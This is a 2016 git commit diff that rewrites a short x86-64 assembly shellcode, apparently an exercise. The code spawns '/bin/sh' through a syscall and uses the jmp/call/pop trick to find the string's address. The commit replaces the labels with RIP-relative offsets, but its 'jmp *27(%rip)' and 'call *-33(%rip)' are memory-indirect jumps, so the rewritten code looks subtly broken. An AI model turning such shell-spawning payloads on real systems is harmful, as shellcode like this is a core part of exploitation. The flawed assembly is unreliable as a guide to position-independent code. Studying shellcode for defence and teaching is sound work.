fdef5bbb1b41fca4a436616f18d86036a3f90bd2
rishdas <sirshakdas@gmail.com>
2016-02-24 20:05:04 -0500

    Instruction Pointer relative addressing

--- part2.s
+++ part2.s
@@ -1,10 +1,7 @@
 	.section .text
-.LC0:
-	.string "/bin/sh"		#The command to be executed
-	.global _start
 _start:
-	jmp     shell
-exec:	popq    %rdi
+	jmp     *27(%rip)
+	popq    %rdi
 	xor     %r10d, %r10d		#XOR to store 0 to be used later
 	movl	%r10d, %edx
 	movl	%r10d, %esi
@@ -13,5 +10,5 @@ exec:	popq    %rdi
 	movl	%r10d, %edi
 	leal    60(%r10d), %eax		#exit(0) system call
 	syscall
-shell:	call    exec			#to return the call to the exec call with return addr
-	.string "/bin/sh"		#The command to executed stored in return addr of call
+	call    *-33(%rip)		#to return the call to the exec call with return addr
+	.string "/bin/sh\0"		#The command to executed stored in return addr of call
